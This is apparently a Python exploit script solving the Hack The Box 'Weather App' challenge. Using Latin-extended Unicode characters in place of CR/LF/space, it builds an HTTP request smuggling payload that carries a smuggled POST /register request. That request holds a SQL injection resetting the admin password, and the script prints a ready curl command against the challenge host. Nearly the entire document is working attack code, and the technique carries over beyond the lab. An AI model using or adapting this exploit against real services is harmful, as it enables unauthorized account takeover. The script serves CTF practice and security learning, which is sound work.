#https://blog.ericturner.it/2021/08/24/hack-the-box-weather-app/?ppwp=1

"""
Hack The Box - Weather App Challenge
HTTP Request Smuggling + SQL injection
24 Aug 2021
"""

import argparse

parser = argparse.ArgumentParser(description='Exploit HTB Weather App')
parser.add_argument('-r', dest='remote', action='store_true',
                    help='Send the payload to the live instance and not localhost')

args = parser.parse_args()

# use the args to determine which server to fire against
if args.remote:
    server = '206.189.125.243'
    port = '32056'
else:
    server = '127.0.0.1'
    port = '1337'

# Ref: https://xenome.io/http-request-smuggling-via-unicode-payloads/

# the unicode values for common control characters
cr = '\u000D'
lf = '\u000A'
sp = '\u0020'
ht = '\u0009'

# the modified control characters from LAT-1-EXT
lat_cr = '\u010D'  # č aka \r
lat_lf = '\u010A'  # Ċ aka \n
lat_sp = '\u0120'  # Ġ
lat_ht = '\u0109'  # ĉ aka \t
lat_amp = '\u0126' # Ħ

# The body of the smuggled request is the SQL Injection
print('Building SQL Injection Payload')
payload = "') ON CONFLICT(username) DO UPDATE SET password='admin' --"
# encode the payload
encoded_payload = payload.replace("'", '%27').replace(' ','%20')
# we have to use lat_amp so it smuggles through
smuggled_body = "username=admin"+lat_amp+"password=admin" + encoded_payload
# don't forget the last required paramater (dont count length)
final = lat_lf + lat_lf + f"GET{lat_sp}/?&country=register"
# now build the headers for the content length
# all of the control characters need to use the latin alternative for this to work
print('Building HTTP Smuggled Request Payload')
# stage 1 is the legitimate payload of the endpoint, then we start injecting unicode
smuggled =  f"endpoint=127.0.0.1:80&city={lat_sp}"

# stage 2 injects a keep-alive connection
smuggled += f"HTTP/1.1{lat_lf}"
smuggled += f"Host:{lat_sp}127.0.0.1:80{lat_lf}"
smuggled += f"Connection:{lat_sp}keep-alive{lat_lf}{lat_lf}{lat_lf}"

# stage 3 injects the actual post request
smuggled += f"POST{lat_sp}/register{lat_sp}HTTP/1.1{lat_lf}"
smuggled += f"Host:{lat_sp}127.0.0.1:80{lat_lf}"
smuggled += f"Content-Type:{lat_sp}application/x-www-form-urlencoded{lat_lf}"
smuggled += f"User-Agent:{lat_sp}Mozilla/5.0{lat_lf}"
smuggled += f"Connection:{lat_sp}keep-alive{lat_lf}"
smuggled += f"Content-Length:{lat_sp}" + str(len(smuggled_body) ) + lat_lf + lat_lf


# now we have built everything for the payload, let's output the request to use in curl
print('Outputting to ./curl.txt')
f = open('curl.txt', 'w+')
#f.write(req1)
f.write(smuggled)
f.write(smuggled_body)
f.write(final)
f.close()

print('Execute with `cat curl.txt | curl --data-binary @- -X POST "http://' + server + ':' + port + '/api/weather"`\r\n')

#python3 weather_app.py -r && cat curl.txt | curl --data-binary @- -X POST "http://188.166.173.208:30978/api/weather"
